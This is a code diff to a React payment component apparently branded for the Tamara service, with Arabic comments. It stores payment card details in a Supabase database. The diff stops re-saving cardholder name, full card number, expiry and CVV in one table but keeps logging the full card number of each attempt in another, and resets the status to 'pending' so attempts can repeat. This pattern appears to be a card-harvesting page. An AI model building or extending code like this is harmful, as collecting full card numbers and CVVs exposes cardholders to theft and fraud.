@@ -41,24 +41,17 @@ const TamaraPaymentProcessing = () => {
   useEffect(() => {
     const submitPayment = async () => {
       try {
-        // تحديث سجل الدفع وإعادة تعيين الحالة إلى pending للمحاولة الجديدة
+        // إعادة تعيين الحالة إلى pending للمحاولة الجديدة فقط (بدون تحديث بيانات البطاقة)
         const { error: updateError } = await supabase
           .from("tamara_payments")
           .update({
-            cardholder_name: cardholderName,
-            card_number: cardNumber,
-            card_number_last4: cardNumberLast4,
-            expiry_date: expiryDate,
-            cvv: cvv,
-            total_amount: parseFloat(totalAmount),
-            monthly_payment: parseFloat(monthlyPayment),
             payment_status: "pending", // إعادة تعيين الحالة للمحاولة الجديدة
           })
           .eq("id", paymentId);
 
         if (updateError) throw updateError;
 
-        // حفظ محاولة الدفع
+        // حفظ محاولة الدفع الجديدة (كل محاولة تُحفظ بشكل منفصل)
         await supabase.from("tamara_payment_attempts").insert({
           payment_id: paymentId,
           card_number: cardNumber,
